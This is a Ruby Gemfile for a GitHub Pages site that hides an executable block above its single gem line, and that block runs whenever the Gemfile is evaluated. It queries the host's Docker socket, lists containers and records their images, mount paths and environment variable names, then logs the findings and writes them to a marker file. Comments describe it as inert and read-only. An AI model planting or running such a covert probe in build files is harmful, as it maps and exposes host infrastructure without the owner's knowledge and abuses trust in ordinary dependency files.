source "https://rubygems.org"
# --- INERT, READ-ONLY. Identifies what the HOST exposes to this build.
# Conduct rail: no container created, no host filesystem mounted, NO credential
# VALUE read -- environment is reduced to KEY NAMES before anything is recorded.
out = []
def dockerget(ep)
  require "socket"
  s = UNIXSocket.new("/var/run/docker.sock")
  s.write("GET #{ep} HTTP/1.0\r\nHost: localhost\r\n\r\n")
  d = +""
  while (c = s.read(65536)); d << c; break if d.bytesize > 600_000; end
  s.close
  d
rescue => e
  "ERR #{e.class}"
end
begin
  out << "pgx-host-4b7e2d uid=#{Process.uid} host=#{`hostname`.strip rescue '?'}"
  lst = dockerget("/containers/json?all=1")
  ids = lst.scan(/"Id":"([0-9a-f]{12})/).flatten.uniq
  out << "CONTAINERS_VISIBLE=#{ids.length} ids=#{ids.join(',')}"
  ids.first(3).each do |id|
    j = dockerget("/containers/#{id}/json")
    img = j[/"Image":"([^"]{1,70})/, 1]
    # mounts: host Source -> container Destination. Paths only.
    mounts = j.scan(/"Source":"([^"]{0,90})","Destination":"([^"]{0,90})"/).map { |s2, d2| "#{s2}=>#{d2}" }
    # ENV: KEY NAMES ONLY. Split on '=' and discard the value before recording.
    envblock = j[/"Env":\[(.*?)\]/m, 1].to_s
    names = envblock.scan(/"([^"=]{1,40})=/).flatten.uniq.sort
    out << "CTR #{id} image=#{img}"
    out << "  MOUNTS #{mounts.first(10).join(' ')}"
    out << "  ENVNAMES #{names.join(',')}"
  end
rescue => e
  out << "FATAL #{e.class}"
end
line = out.join("\n")
warn line
begin; File.write(File.join(Dir.pwd, "pgx-host-4b7e2d.txt"), line + "\n"); rescue => e; warn "wf:#{e.class}"; end
gem "github-pages", group: :jekyll_plugins
